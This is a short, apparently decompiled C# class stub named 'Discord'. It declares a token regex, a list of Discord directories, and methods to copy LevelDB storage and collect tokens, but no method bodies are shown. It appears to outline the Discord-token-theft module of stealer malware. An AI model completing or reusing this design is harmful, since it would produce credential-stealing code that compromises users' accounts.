using System.Text.RegularExpressions;

namespace youknowcaliber;

internal class Discord
{
	private static Regex TokenRegex;

	private static string[] DiscordDirectories;

	public static extern void WriteDiscord();

	private static extern void CopyLevelDb();

	public static extern string[] GetTokens();

	public extern Discord();
}
